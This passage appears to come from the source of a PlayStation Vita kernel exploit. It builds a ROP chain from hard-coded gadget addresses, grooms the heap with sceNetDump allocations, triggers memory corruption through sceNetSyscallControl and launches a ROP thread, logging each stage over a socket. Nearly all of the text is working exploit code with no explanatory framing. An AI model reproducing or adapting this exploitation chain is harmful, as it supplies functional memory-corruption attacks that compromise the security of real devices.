	store(0x89418cb9, user_ropchain+0x1C); // 0x89418cb8 : str r0, [r4] ; pop {r4, pc}
	store(0, user_ropchain+0x20); // r4
	store(infinite_loop, user_ropchain+0x24); // pc
	
	snprintf(outbuffer, 256, "creating user ropchain\n");
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	// create thread for task
	create_rop_thread(user_ropchain, 0x28);
	store(&return, ropchain_size);
		snprintf(outbuffer, 256, "ropchiain size 0x%08X\n", [ropchain_size]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	sceNetDumpDestroy([another_hole]);
	
	sceAppUtilLoadSafeMemory(result, 4, QWORD(0xFF8));
	
	snprintf(outbuffer, 256, "goodbye for now... last v = 0x%08X\n", [result]);
	strlen(outbuffer);
	send([g_socket], outbuffer, &return, 0, 0, 0);
	
	// NO MORE NETWORK USE BEYOND THIS POINT
	// if you need network access, move it to the top!!
	
	store(0xB15B00B5, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	
	create_largest_dump(0xF0000, 0);	
	store(&return, dumps+0);
	store(0xB15B00B6, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	
	add([result], -0x1000);
	and(&return, 0x80000000);
	equals(&return, 0x80000000);
	
	create_largest_dump([result], &return);
	store(&return, dumps+4);
	
	store(0xB15B00B7, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	create_last_dump(last_dump_size-64, 5);
	last_dump_failed(&return);
	
	// start ROP thread
	add([ngs::ngs_base], 0x1000);
	store(&return, result);
	
	sceKernelStartThread([THID], [ropchain_size], [result]);
	store(&return, result2);
	
	sceKernelDelayThread(1*1000*1000);
	
	//store(0xB15B00B8, result);
	sceAppUtilSaveSafeMemory(result, 4, QWORD(0xFF8));
	free_sockets(sockets, need_sockets);
	
	sceNetSyscallClose([tester]);
	sceNetSyscallControl(0, 0x30000000, mybuf, 0xFC);
	sceNetDumpDestroy([dump_to_free]);
	
	store(0xB15B00B9, result);
	sceAppUtilSaveSafeMemory(result2, 4, QWORD(0xFF8));
	
	
	sceAppUtilSaveSafeMemory(pret, 4, QWORD(0xFF8));
	sceKernelDelayThread(1*1000*1000);
	
	sceKernelDelayThread(2*1000*1000);
	store(0, 0);
}